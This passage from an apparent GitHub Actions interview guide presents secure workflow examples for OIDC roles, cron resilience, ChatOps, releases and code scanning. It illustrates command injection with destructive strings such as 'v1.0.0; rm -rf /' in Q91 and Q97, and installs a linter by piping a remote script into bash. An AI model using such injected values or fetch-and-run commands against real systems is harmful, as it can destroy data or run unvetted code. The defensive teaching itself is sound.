The **credential isolation** is the security spine and a defense-in-depth pattern: each environment assumes a *separate* IAM role whose **OIDC trust policy is pinned to that environment's claim** (`repo:org/app:environment:production` for the prod role). So even if the dev pipeline is compromised, its OIDC token's `sub` is `environment:dev` and *cannot* assume the prod role — GitHub enforces the environment boundary by which secrets/role a job in that environment can reach, *and* the cloud enforces it via the claim-pinned trust policy. Combine with **environment-scoped secrets** so prod credentials simply don't exist in the dev/staging jobs. The trade-offs: the human gate on prod adds latency (acceptable — it's the deliberate brake), and promoting one immutable artifact means you must *not* rebuild per stage (rebuilding breaks the "deploy the tested bits" guarantee). The senior framing is: one signed immutable artifact promoted through escalating gates, with per-environment OIDC roles pinned to the environment claim so blast radius is contained at both the GitHub and cloud layers — that dual enforcement (GitHub environment + IAM trust policy) is the defense-in-depth an interviewer is listening for.

#### Q88. [Practical] How do you make a scheduled job resilient to GitHub's best-effort cron (missed/delayed runs) when the work must actually happen?

The premise to establish first: GitHub's `schedule` trigger is **explicitly best-effort** — runs can be **delayed or dropped** under load (especially at the top of the hour), the granularity is 5 minutes, times are UTC, and scheduled workflows are **auto-disabled after ~60 days of repo inactivity**. So if the work *must* happen (a nightly data export, a certificate renewal, a billing job), you cannot treat cron as a guaranteed timer — you design for missed runs rather than assuming they won't occur. The core principle is **idempotent catch-up**: the job determines what work is outstanding and does it, rather than assuming "it's 2 AM, do exactly today's batch."

```yaml
on:
  schedule:
    - cron: '23 2 * * *'        # 02:23 UTC — off the hour to dodge congestion
  workflow_dispatch: {}         # manual escape hatch to run it on demand
jobs:
  nightly:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Process all outstanding work (idempotent catch-up)
        run: |
          # don't do "today's" batch — do everything not yet done since last success
          ./process.sh --since "$(./last-success.sh)" --idempotent
          ./record-success.sh   # persist a high-water mark in durable storage
```

```
resilience design for must-happen scheduled work
  1. off-hour cron (e.g. :23) → dodge top-of-hour congestion/drops
  2. idempotent catch-up      → process everything outstanding, not "today only"
  3. durable high-water mark  → external store records last success; a missed run catches up next time
  4. workflow_dispatch        → manual re-run if a run was dropped
  5. external dead-man's-switch monitor → alert if no success in N hours
  6. keep repo active / re-enable → avoid the 60-day auto-disable
```

The defenses, layered: (1) **spread cron off the hour** (`23 2 * * *` not `0 2 * * *`) to reduce the chance of being dropped during peak scheduling load. (2) **Idempotent catch-up logic** — the job reads a durable **high-water mark** (last successful processing point, stored externally, *not* in a cache which can be evicted) and processes everything since then, so a *missed* run is automatically made up by the *next* run rather than leaving a permanent gap. (3) A **dead-man's-switch monitor** *outside* GitHub (a Healthchecks.io / Cronitor / external scheduler ping the job sends on success) that **alerts if no success was recorded in N hours** — this is how you *detect* a dropped run, since GitHub won't tell you a cron didn't fire. (4) `workflow_dispatch` as a manual escape hatch to re-run on demand. (5) Keep the repo active (or use the API to re-enable) so the 60-day auto-disable doesn't silently kill the schedule.

The escalation for *truly* critical timing: if even best-effort-plus-catch-up isn't acceptable (a hard SLA, sub-5-minute cadence, exactly-once semantics), I move the *trigger* off GitHub entirely — an external scheduler (a cloud cron/EventBridge/k8s CronJob) that fires `repository_dispatch` or the `workflow_dispatch` API on a reliable timer, using Actions only as the *executor*. This separates "when it fires" (now reliable, external) from "what it does" (Actions), trading a bit of architecture for a real guarantee. The senior framing is: never rely on GitHub cron for guaranteed or precise execution — design idempotent catch-up so missed runs self-heal, add external monitoring to *detect* drops, provide a manual re-run path, and for hard SLAs trigger from a reliable external scheduler. The anti-pattern is a `0 0 * * *` job that does "today's batch" non-idempotently with no monitoring — one dropped run leaves a permanent, silent gap.

## 🧩 Extended Questions — Set 3: Coding, Design & Expert Scenarios

### 🟢 Basic — extended

#### Q89. [Coding] Write a workflow that posts a friendly comment on every newly opened pull request.

**Problem:** When a contributor opens a PR, automatically greet them with a comment that links the contributing guide. This is a classic "first useful automation" task and it also forces you to reason about the *minimum* permissions and the right event.

The correct event is `pull_request` with the `opened` activity type (not `synchronize`, which would re-comment on every push). The `GITHUB_TOKEN` needs `pull-requests: write` to comment — and *nothing else*, because the least-privilege habit starts on trivial workflows. I use `gh` (pre-installed on hosted runners) rather than a third-party action so the dependency surface is zero.

```yaml
name: PR Greeter
on:
  pull_request:
    types: [opened]        # only the first time, not on every push

permissions:
  pull-requests: write     # the ONLY scope this needs

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Comment on the PR
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR: ${{ github.event.pull_request.number }}
          AUTHOR: ${{ github.event.pull_request.user.login }}
        run: |
          gh pr comment "$PR" --repo "$GITHUB_REPOSITORY" --body \
            "Thanks for the PR, @${AUTHOR}! Please read CONTRIBUTING.md and make sure CI is green."
```

**Why it is written this way:** the author login and PR number flow through **env vars**, not direct `${{ }}` interpolation into the `run:` body — even though `pull_request.user.login` is a constrained value, treating *all* event data as untrusted-by-default is the discipline that prevents the script-injection class of bug (a malicious *branch name* or *PR title* in a less careful version is genuinely attacker-controlled). **Edge case:** on a *fork* PR this event still runs, but the token is read-only — `pull-requests: write` is silently downgraded, so the comment fails. If commenting on fork PRs is required, you split it into a `pull_request_target` (metadata-only, no checkout of PR code) or a `workflow_run` follow-up. For a same-repo workflow this version is correct and safe.

#### Q90. [Coding] Write a workflow that fails CI if any source file is missing a license header.

**Problem:** Enforce that every `.go`/`.py`/`.ts` file under `src/` starts with a license header, and fail the build with a clear, file-level annotation when one is missing. This tests whether you can write a real *gate* (not just run a tool) and surface results the way GitHub renders them.

The trick worth knowing is the `::error file=...::` workflow command, which turns a plain log line into an inline annotation on the offending file in the PR "Files changed" view — far more useful than a buried log message. I accumulate failures and exit non-zero at the end so the report lists *every* offender in one run rather than stopping at the first.

```yaml
name: License Header Check
on: [pull_request]
permissions:
  contents: read

jobs:
  license:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Verify headers
        shell: bash
        run: |
          set -euo pipefail
          fail=0
          while IFS= read -r f; do
            if ! head -n 5 "$f" | grep -q "SPDX-License-Identifier"; then
              echo "::error file=${f},line=1::Missing SPDX license header"
              fail=1
            fi
          done < <(find src -type f \( -name '*.go' -o -name '*.py' -o -name '*.ts' \))
          if [ "$fail" -ne 0 ]; then
            echo "::notice::Add 'SPDX-License-Identifier: Apache-2.0' to the top of each flagged file."
            exit 1
          fi
```

**Why this shape:** `set -euo pipefail` makes the script fail loudly on any unexpected error (an unset var, a failed command in a pipe) rather than masking it — without it, a typo'd `find` could "pass" with zero files checked, which is the worst kind of green build. Using process substitution `< <(find ...)` instead of `find ... | while` keeps the loop in the *current* shell so the `fail` variable survives (a piped `while` runs in a subshell and the variable change is lost — a classic bash foot-gun an interviewer may probe). **Trade-off:** for large repos this is fine because it is read-only and fast; a more polished version uses a dedicated tool like `licensee` or `addlicense --check`, but the hand-rolled version proves you understand annotations and shell correctness.

#### Q91. [Coding] Write a manually-triggered workflow that takes a typed input and uses it to drive a deploy, with input validation.

**Problem:** Give operators a "Run workflow" button to deploy a chosen version to a chosen environment, with the environment constrained to a dropdown and the version validated before anything runs. This exercises `workflow_dispatch` inputs (the canonical manual-ops trigger) and the discipline of validating operator input.

`workflow_dispatch` adds a UI form (and an API/`gh` entry point) with typed inputs — `choice` for an enumerated dropdown, `string` for free text, `boolean` for a toggle. The `choice` type is itself a guardrail: the operator *cannot* pick an environment outside the list. Free-text inputs, however, are still operator-controlled data and must be validated and never interpolated raw into a shell.

```yaml
name: Manual Deploy
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        type: choice
        options: [staging, production]   # dropdown — can't pick anything else
        required: true
      version:
        description: 'Version tag to deploy (e.g. v1.4.2)'
        type: string
        required: true

permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}   # ties into env protection rules
    steps:
      - name: Validate version format
        env:
          VERSION: ${{ inputs.version }}      # untrusted text → env var
        run: |
          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+$'; then
            echo "::error::Invalid version '$VERSION'; expected vMAJOR.MINOR.PATCH"
            exit 1
          fi
      - run: ./deploy.sh "${{ inputs.environment }}" "$VERSION"
        env: { VERSION: ${{ inputs.version }} }
```

**Why validate even a manual input:** an operator can fat-finger `v1.4` or paste `v1.0.0; rm -rf /`, so the free-text `version` flows through an env var and is checked against a regex before use — `choice` inputs are self-validating, but `string` inputs are not. **Why `environment: ${{ inputs.environment }}` is more than cosmetic:** binding the job to the chosen environment means the environment's *protection rules* (required reviewers, branch policy, scoped secrets) apply automatically — so selecting `production` in the form can trigger an approval gate, and prod secrets only materialize for the prod run. **Edge case:** `workflow_dispatch` always runs the workflow from the **default branch**, so a version of this file on a feature branch won't appear in the UI until merged — a frequent "where's my Run-workflow button?" confusion for newcomers.

#### Q92. [Coding] Write a scheduled workflow that closes stale issues and PRs, but never touches anything labeled `keep`.

**Problem:** Automatically comment on and then close issues/PRs with no activity for 60 days, but exempt anything carrying a `keep` (or `pinned`) label. This is a classic maintenance automation and it tests the `schedule` trigger, least-privilege scopes, and safe exemption logic.

The standard tool is `actions/stale`, which is well-tested and handles the warn-then-close lifecycle (comment after N days idle, close after M more idle days) and label exemptions declaratively — reaching for the maintained action over a hand-rolled API loop is itself the right instinct for a robust, rate-limit-aware job.

```yaml
name: Close Stale
on:
  schedule:
    - cron: '17 1 * * *'        # 01:17 UTC daily — off the hour to dodge congestion
  workflow_dispatch: {}         # manual run for testing

permissions:
  issues: write                 # to comment/close issues
  pull-requests: write          # to comment/close PRs

jobs:
  stale:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/stale@v9
        with:
          days-before-stale: 60
          days-before-close: 7
          stale-issue-label: stale
          exempt-issue-labels: 'keep,pinned,security'   # never touch these
          exempt-pr-labels: 'keep,pinned'
          stale-issue-message: 'No activity for 60 days — marking stale; closes in 7 days unless updated.'
          close-issue-message: 'Closing as stale. Comment to reopen.'
          operations-per-run: 100   # cap API calls to respect rate limits
```

**Why off-the-hour cron (`17 1 * * *`):** GitHub's scheduled triggers are best-effort and runs at the top of the hour (`0`) are the most likely to be delayed or dropped under load — shifting to `:17` reduces that risk for a job that should run daily. **Why the exemption labels matter:** the `exempt-*-labels` list is the safety valve so a deliberately-pinned tracking issue or a long-running security discussion is never auto-closed; getting this wrong (and auto-closing important issues) is the kind of mistake that makes a team rip the automation out, so the exemption is non-negotiable. **Why `operations-per-run`:** the `GITHUB_TOKEN` has secondary rate limits, and a repo with thousands of stale items could exhaust them in one run — the cap spreads the work across days. **Least-privilege note:** the workflow grants only `issues: write` and `pull-requests: write`, nothing else — the habit of scoping `permissions` tightly applies even to a humble housekeeping job.

### 🟡 Intermediate — extended

#### Q93. [Coding] Author a JavaScript action from scratch with typed inputs, an output, and proper failure handling.

**Problem:** Build a reusable JavaScript action that takes a `files-glob` input, counts matching files, sets a `count` output, and fails the step with a clear message if the count is below a `min` threshold. JS actions are the right tool when you need cross-OS logic with inputs/outputs and want millisecond startup (versus a Docker action's image pull).

A JS action is a directory with an `action.yml` metadata file plus a bundled entrypoint. The entrypoint uses `@actions/core` (the official toolkit) for input/output/logging because it handles the `GITHUB_OUTPUT` file plumbing and masking correctly — hand-rolling `console.log("::set-output...")` is both deprecated and injection-prone.

```yaml
# count-files/action.yml
name: 'Count Files'
description: 'Count files matching a glob and enforce a minimum'
inputs:
  files-glob:
    description: 'Glob to match'
    required: true
  min:
    description: 'Fail if fewer than this many files match'
    required: false
    default: '1'
outputs:
  count:
    description: 'Number of matching files'
runs:
  using: 'node20'          # pin the Node runtime; node20 is current in 2026
  main: 'dist/index.js'    # the BUNDLED entrypoint (committed)
```

```javascript
// count-files/src/index.js  (bundled to dist/index.js with @vercel/ncc)
const core = require('@actions/core');
const glob = require('@actions/glob');

async function run() {
  try {
    const pattern = core.getInput('files-glob', { required: true });
    const min = parseInt(core.getInput('min') || '1', 10);

    const globber = await glob.create(pattern);
    const files = await globber.glob();
    const count = files.length;

    core.setOutput('count', count.toString());   // → $GITHUB_OUTPUT
    core.info(`Matched ${count} file(s) for ${pattern}`);

    if (count < min) {
      core.setFailed(`Expected at least ${min} file(s), found ${count}`);
    }
  } catch (err) {
    core.setFailed(err instanceof Error ? err.message : String(err));
  }
}
run();
```

**Critical packaging detail:** the runner does **not** run `npm install` for your action — it executes `dist/index.js` as-is, so you must **bundle** dependencies (`ncc build src/index.js -o dist`) and **commit** `dist/`. Forgetting this is the #1 "my action can't find a module" failure. `core.setFailed()` both prints an error annotation *and* sets a non-zero exit, which is the idiomatic way to fail; throwing an unhandled exception works but produces an uglier stack trace. **Trade-off:** committing built `dist/` bloats history and risks drift from source — many teams add a CI check that re-bundles and fails if `dist/` is stale, or publish releases via a build pipeline so the tag always carries a fresh bundle.

#### Q94. [Coding] Author a Docker container action that runs a tool not available on the runner.

**Problem:** You need an action that runs a specific, pinned version of a CLI (say a custom linter) that isn't on the hosted runner and that you don't want to install every run. A Docker container action lets you ship the exact toolchain, at the cost of being Linux-only and paying an image build/pull.

The action is a directory with an `action.yml` declaring `using: docker`, a `Dockerfile` (or a pre-published image reference), and an entrypoint script. Inputs arrive as `INPUT_<NAME>` environment variables inside the container, and the workspace is bind-mounted at `/github/workspace`.

```yaml
# mylint/action.yml
name: 'My Lint'
description: 'Run pinned custom linter in a container'
inputs:
  path:
    description: 'Directory to lint'
    default: '.'
runs:
  using: 'docker'
  image: 'Dockerfile'           # build locally; or 'docker://ghcr.io/org/mylint:1.4.2'
  args:
    - ${{ inputs.path }}
```

```dockerfile
# mylint/Dockerfile
FROM alpine:3.20
RUN apk add --no-cache mylint=1.4.2   # PINNED version baked into the image
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

```bash
# mylint/entrypoint.sh
#!/bin/sh -l
set -e
echo "Linting $1"
mylint --strict "$1"          # $1 is the 'args' value passed from action.yml
```

**Performance and security notes:** building the `Dockerfile` on every run costs seconds-to-minutes; for a hot path, **publish the image to GHCR and reference it by digest** (`docker://ghcr.io/org/mylint@sha256:...`) so the runner just pulls a cached layer — and pinning by digest is the supply-chain-safe form. The container runs **as root** by default with `GITHUB_WORKSPACE` bind-mounted, so files it creates are root-owned — a frequent "permission denied in a later step" surprise; fix by `chown`-ing outputs or adding `USER` to the Dockerfile. **The decisive trade-off:** this action will **not** run on Windows or macOS matrix legs (Docker actions are Linux-only), so if cross-OS support matters, you re-author it as a JavaScript action or a composite that installs the tool per-OS.

#### Q95. [Coding] Generate a build matrix dynamically from a config file and fan results back in.

**Problem:** Instead of hardcoding the matrix, read the list of services to build from a `services.json` in the repo, fan out one job per service, then have a final job that fails only if *any* leg failed and produces a summary. This is the canonical "data-driven matrix" pattern and it exercises job outputs, `fromJSON`, and result aggregation.

A generator job emits a JSON array as an output; the build job's `strategy.matrix` consumes it via `fromJSON()`. The fan-in job uses `needs.*.result` and `if: always()` so it runs even when a leg fails.

```yaml
name: Dynamic Matrix
on: [push]
permissions:
  contents: read

jobs:
  set-matrix:
    runs-on: ubuntu-latest
    outputs:
      services: ${{ steps.gen.outputs.services }}
    steps:
      - uses: actions/checkout@v4
      - id: gen
        run: |
          # compact the JSON to one line; must be valid JSON for fromJSON()
          echo "services=$(jq -c '.services' services.json)" >> "$GITHUB_OUTPUT"

  build:
    needs: set-matrix
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        service: ${{ fromJSON(needs.set-matrix.outputs.services) }}
    steps:
      - uses: actions/checkout@v4
      - run: ./build.sh "${{ matrix.service }}"

  gate:
    needs: build
    if: always()                       # run even if a build leg failed
    runs-on: ubuntu-latest
    steps:
      - name: Fail if any build failed
        run: |
          result='${{ needs.build.result }}'
          echo "Aggregate build result: $result"
          [ "$result" = "success" ] || exit 1
```

**Why `needs.build.result` works for the whole matrix:** when a job is a matrix, `needs.<job>.result` collapses to a single aggregate — `success` only if *all* legs succeeded, otherwise `failure`/`cancelled`. That is exactly what you want for a gate, and it sidesteps the matrix-output-collision trap (recall all matrix legs write to the same output name, so per-leg outputs are unreliable). **Edge cases:** if `services.json` yields an **empty array**, the `build` job produces **zero jobs** and `needs.build.result` is `skipped` — my gate treats that as a failure, which is usually right (an empty build list is probably a bug); guard the generator with a fallback if empty is legitimate. The JSON *must* be compact and valid — `jq -c` guarantees this; a stray newline or single-quoted JSON makes `fromJSON()` throw at parse time.

#### Q96. [Coding] Publish a Python package to PyPI using OIDC trusted publishing (no API token).

**Problem:** Release a Python package to PyPI on every `v*` tag, without storing a PyPI API token as a secret. PyPI supports OIDC "trusted publishing," which is the modern, token-free path and a direct application of the OIDC model to a package registry rather than a cloud provider.

The flow: PyPI is configured (in the project's publishing settings) to trust a specific GitHub repo + workflow + environment. The job requests an OIDC token (`id-token: write`), and the official `pypa/gh-action-pypi-publish` action exchanges it with PyPI for a short-lived upload credential. No long-lived token ever exists.

```yaml
name: Publish to PyPI
on:
  push:
    tags: ['v*']

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.12' }
      - run: pip install build && python -m build   # produces dist/*.whl, *.tar.gz
      - uses: actions/upload-artifact@v4
        with: { name: dist, path: dist/ }

  publish:
    needs: build
    runs-on: ubuntu-latest
    environment: pypi            # protect with required reviewers if desired
    permissions:
      id-token: write            # REQUIRED for OIDC trusted publishing
    steps:
      - uses: actions/download-artifact@v4
        with: { name: dist, path: dist/ }
      - uses: pypa/gh-action-pypi-publish@release/v1
        # no 'password:' / token — OIDC handles auth against PyPI
```

**Why split build and publish:** the `build` job needs **no** elevated permissions and produces the artifact; only the tiny `publish` job carries `id-token: write` and is bound to a protected `environment`. This least-privilege split means the code-running job can't mint an OIDC token, shrinking the blast radius if a build dependency is compromised. **The design insight worth stating:** OIDC trusted publishing also pins trust to the *repository + workflow + environment* on PyPI's side, so even if someone forks your repo, their fork can't publish to your package — the same claim-scoping that protects cloud roles protects the registry. **Edge case:** trusted publishing requires the PyPI project to be pre-configured with the exact repo/workflow/environment names; a mismatch yields an auth rejection, which is the registry equivalent of a bad IAM `sub` condition.

#### Q97. [Coding] Build a ChatOps workflow: trigger a deploy from a `/deploy` PR comment, with permission checks.

**Problem:** Let maintainers type `/deploy staging` in a PR comment to trigger a deployment, but ignore the command from anyone without write access. ChatOps is a common senior-level ask because it combines event parsing, authorization, and safe handling of untrusted input.

The event is `issue_comment` (PRs are issues for comment purposes). The two hard parts are (1) **parsing** the command safely and (2) **authorizing** the commenter — never trust that "they could comment" means "they may deploy." I check the commenter's association/permission via the API before doing anything.

```yaml
name: ChatOps Deploy
on:
  issue_comment:
    types: [created]

permissions:
  contents: read
  pull-requests: write     # to react/reply

jobs:
  deploy:
    # gate: only PR comments that start with "/deploy"
    if: >
      github.event.issue.pull_request &&
      startsWith(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    steps:
      - name: Verify commenter has write access
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ACTOR: ${{ github.event.comment.user.login }}
        run: |
          perm=$(gh api "repos/$GITHUB_REPOSITORY/collaborators/$ACTOR/permission" \
                   --jq '.permission')
          echo "Permission: $perm"
          case "$perm" in admin|write|maintain) ;; *)
            echo "::error::$ACTOR lacks write access; ignoring /deploy"; exit 1;; esac
      - name: Parse target environment
        id: parse
        env:
          BODY: ${{ github.event.comment.body }}   # untrusted → env var, not inline
        run: |
          target=$(printf '%s' "$BODY" | awk '{print $2}')
          case "$target" in staging|production) ;; *)
            echo "::error::Unknown target '$target'"; exit 1;; esac
          echo "target=$target" >> "$GITHUB_OUTPUT"
      - run: ./deploy.sh "${{ steps.parse.outputs.target }}"
```

**The two senior-grade safeguards:** First, the comment body is **attacker-influenceable** (anyone can comment on a public repo), so it goes through the `BODY` env var and is parsed with `awk` rather than interpolated into the shell — a comment of `/deploy "; rm -rf /` cannot inject. Second, I **explicitly check write permission via the API** rather than relying on `author_association`, which can be spoofed-by-confusion (e.g. `CONTRIBUTOR` doesn't mean trusted). I also validate the target against an allowlist so a typo or hostile value can't reach `deploy.sh`. **Edge case:** `issue_comment` fires for both issues and PRs, so the `github.event.issue.pull_request` guard is mandatory — without it the workflow runs on plain issue comments where there's no PR to deploy. A polished version adds a 👀 reaction on accept and a ✅/❌ on completion via `gh api` for operator feedback.

#### Q98. [Coding] Write a release workflow that auto-bumps the version, generates a changelog, tags, and creates a GitHub Release.

**Problem:** On merge to `main`, determine the next semantic version from the commit messages, update the changelog, create the git tag, and publish a GitHub Release — all automatically. This is the "release-please/semantic-release" pattern; an interviewer wants to see you understand conventional commits, the recursion-trigger gotcha, and the token nuance.

I'll show the explicit-control version using `googleapis/release-please-action`, which reads Conventional Commits, opens a "release PR" that bumps the version and changelog, and — when *that* PR merges — tags and creates the Release. The subtlety is the **token**: a release that pushes a tag with the default `GITHUB_TOKEN` will **not** trigger downstream tag-based workflows (the recursion loop-breaker), so if your publish pipeline keys off the tag, you need a PAT or App token.

```yaml
name: Release
on:
  push:
    branches: [main]

permissions:
  contents: write          # create tags/releases
  pull-requests: write     # open the release PR

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: googleapis/release-please-action@v4
        id: rp
        with:
          # default GITHUB_TOKEN is fine UNLESS a tag must re-trigger another workflow
          token: ${{ secrets.RELEASE_PLEASE_PAT || secrets.GITHUB_TOKEN }}
          release-type: node

      # downstream publish only when a release was actually created
      - if: ${{ steps.rp.outputs.release_created }}
        uses: actions/checkout@v4
      - if: ${{ steps.rp.outputs.release_created }}
        run: npm ci && npm publish
        env: { NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }} }
```

**The recursion gotcha, made explicit:** events caused by the `GITHUB_TOKEN` do not start new workflow runs — by design, to stop infinite loops. So if you `git push` a tag using `GITHUB_TOKEN`, a separate `on: push: tags:` publish workflow **won't fire**. The two fixes are (1) chain the publish *within the same workflow* gated on `release_created` (shown above — cleanest), or (2) push with a PAT/App token so the tag event *does* re-trigger. **Why conventional commits:** the version bump (`fix:` → patch, `feat:` → minor, `feat!:`/`BREAKING CHANGE` → major) is *derived* from commit history, so the changelog and SemVer decision are reproducible and reviewable in the release PR before anything is tagged. **Trade-off:** this requires team discipline on commit messages; teams that won't adopt that convention fall back to a manual `workflow_dispatch` with a version input — less automatic but no convention dependency.

#### Q99. [Coding] Add a security gate: run a SAST scan and upload SARIF so findings appear in the Security tab and block risky PRs.

**Problem:** Run CodeQL (or a Trivy/Semgrep scan) on PRs, upload the results as SARIF so they render in the repo's Security tab and as inline PR annotations, and optionally fail the build on high-severity findings. This tests whether you can wire scanning into the *platform's* native surfaces rather than dumping a log.

The key mechanism is the **SARIF upload** via `github/codeql-action/upload-sarif` (or CodeQL's own `analyze` step), which requires `security-events: write`. SARIF is the standard interchange format; uploading it makes GitHub deduplicate findings, track them across commits, and show them inline — far better than a raw log.

```yaml
name: Code Scanning
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read
  security-events: write     # REQUIRED to upload SARIF / write code-scanning alerts

jobs:
  codeql:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with: { languages: javascript-typescript }
      - uses: github/codeql-action/autobuild@v3
      - uses: github/codeql-action/analyze@v3      # runs analysis + uploads SARIF

  trivy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: aquasecurity/trivy-action@0.28.0
        with:
          scan-type: fs
          format: sarif
          output: trivy.sarif
          severity: CRITICAL,HIGH
          exit-code: '0'                 # don't fail here; let the gate decide
      - uses: github/codeql-action/upload-sarif@v3
        with: { sarif_file: trivy.sarif }
```

**Why upload SARIF instead of failing on a log:** the Security tab gives you deduplication, dismissal-with-justification, and a historical trend, and the alerts can be enforced via **branch protection** ("require code scanning to pass") — that's a policy gate the *platform* enforces at merge, not a brittle `grep` in your script. Setting `exit-code: '0'` on Trivy and letting branch protection / a code-scanning alert threshold decide is deliberate: it separates *detection* (always upload everything) from *enforcement* (configurable policy), so a new medium-severity finding doesn't surprise-break every PR. **Permissions note:** `security-events: write` is the scope people forget; without it the upload 403s. On fork PRs, code scanning runs but uploads are restricted — for full coverage on forks you analyze on `push` to `main` after merge as a backstop.

#### Q100. [Coding] Write a composite action that wraps a flaky network call in retry-with-backoff, usable from any workflow.

**Problem:** Many workflows have a step that occasionally fails on a transient network blip (pulling a dependency, hitting a rate-limited API). Build a reusable composite action that runs an arbitrary command with bounded retries and exponential backoff, so callers don't copy-paste retry loops. This exercises composite-action authoring, input handling, and the *judgment* of when retrying is correct.

The action takes the command, a max-attempts count, and a base delay, then loops in bash with exponential backoff. The important constraints: every `run:` step in a composite action **must** declare `shell:`, and the command must arrive as data (an input referenced via env) so it isn't injected.

```yaml
# .github/actions/retry/action.yml
name: 'Retry'
description: 'Run a command with exponential-backoff retries'
inputs:
  command:      { description: 'Command to run', required: true }
  max-attempts: { description: 'Max attempts', required: false, default: '3' }
  base-delay:   { description: 'Base delay seconds', required: false, default: '2' }
runs:
  using: composite
  steps:
    - shell: bash
      env:
        CMD: ${{ inputs.command }}          # untrusted → env, not inline
        MAX: ${{ inputs.max-attempts }}
        BASE: ${{ inputs.base-delay }}
      run: |
        set -uo pipefail
        attempt=1
        until bash -c "$CMD"; do
          if [ "$attempt" -ge "$MAX" ]; then
            echo "::error::Command failed after $MAX attempts"; exit 1
          fi
          delay=$(( BASE * 2 ** (attempt - 1) ))   # exponential: 2,4,8,...
          echo "::warning::Attempt $attempt failed; retrying in ${delay}s"
          sleep "$delay"
          attempt=$(( attempt + 1 ))
        done
```

```yaml
# caller
- uses: ./.github/actions/retry
  with:
    command: "curl -fsSL https://flaky.example.com/api | tee out.json"
    max-attempts: '5'
```

**Why exponential, not fixed, backoff:** if the remote is rate-limited or recovering, hammering it every 2 seconds makes congestion worse; doubling the delay (2→4→8) gives the dependency room to recover and is the standard well-behaved-client pattern. **The senior caveat — when retrying is the *wrong* fix:** retries are correct only for genuinely *transient, idempotent* failures. Retrying a **non-idempotent** operation (a POST that created a resource, a deploy that partially applied) can double-charge, double-create, or corrupt state — so this action is safe for reads/pulls but dangerous wrapped around a mutating call without idempotency keys. And retrying to paper over a *deterministic* failure (a real bug, a bad credential) just wastes minutes and delays the inevitable red — so the action emits a clear "failed after N attempts" rather than silently swallowing. **Composite gotcha:** because composite steps inline into the caller's job, the action sees the caller's working directory and env — convenient, but it means the command runs with the caller's full context, not an isolated one.

#### Q101. [Coding] Build a workflow that writes a rich Markdown job summary (test results, coverage, deploy URL) instead of burying it in logs.

**Problem:** Make a CI run's outcome readable at a glance — a table of test pass/fail counts, a coverage figure, and (on deploy) the environment URL — rendered on the run's summary page rather than scrolled-for in logs. This tests knowledge of `GITHUB_STEP_SUMMARY`, the sanctioned channel for human-facing output.

`$GITHUB_STEP_SUMMARY` is a file path; anything you append (GitHub-flavored Markdown) renders on the run summary. Multiple steps append to it cumulatively. It's distinct from logs: logs are the play-by-play, the summary is the headline an on-call engineer reads first.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: 'npm' }
      - run: npm ci
      - name: Run tests, capture machine-readable results
        id: t
        run: |
          npm test -- --json --outputFile=results.json || true
          passed=$(jq '.numPassedTests' results.json)
          failed=$(jq '.numFailedTests' results.json)
          cov=$(jq -r '.coverageMap | "n/a"' results.json 2>/dev/null || echo "n/a")
          echo "failed=$failed" >> "$GITHUB_OUTPUT"
          {
            echo "## Test Results"
            echo ""
            echo "| Metric | Value |"
            echo "| --- | --- |"
            echo "| Passed | $passed |"
            echo "| Failed | $failed |"
            echo "| Coverage | ${cov} |"
          } >> "$GITHUB_STEP_SUMMARY"
      - name: Fail the job if any test failed
        if: steps.t.outputs.failed != '0'
        run: exit 1
```

**Why separate the summary from the gate:** the summary step *always* writes the table (even on failure, because it runs before the gate), so the headline is present whether the run is green or red; a *separate* step enforces the pass/fail so the readable report and the build verdict are decoupled. Writing the metrics to **both** `$GITHUB_OUTPUT` (machine-readable, for downstream `if:`) and `$GITHUB_STEP_SUMMARY` (human-readable) is the idiomatic dual-channel pattern. **Gotchas:** the summary has a size cap (~1 MB per step), so dump *summaries* not full logs into it; and you append with `>>` — using `>` would truncate a prior step's contribution. **Why it matters operationally:** at 3am an on-call engineer wants the verdict and the deploy URL in two seconds, not a 4000-line log; the step summary is the difference between a pipeline that *communicates* and one that just *runs*.

#### Q102. [Practical] Design how you'd test and lint your workflows themselves before they hit `main`. How do you "CI your CI"?

The senior instinct here is recognizing that workflow YAML is *code* and deserves the same quality gates as application code — yet it's notoriously hard to test because the only true runtime is GitHub's. So I'd describe a layered strategy: static validation cheaply, local execution for logic, and canary execution for the rest. The first layer is **schema + lint**: `actionlint` catches the bulk of mistakes (invalid `${{ }}` expressions, undefined contexts, shellcheck issues *inside* `run:` blocks, deprecated syntax) and runs in milliseconds as a required PR check on changes to `.github/workflows/**`. This alone eliminates most "pushed a broken workflow, found out on `main`" pain.

```yaml
# lint the workflows themselves
name: Lint Workflows
on:
  pull_request:
    paths: ['.github/workflows/**', '.github/actions/**']
permissions: { contents: read }
jobs:
  actionlint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          bash <(curl -fsSL https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash)
          ./actionlint -color
```

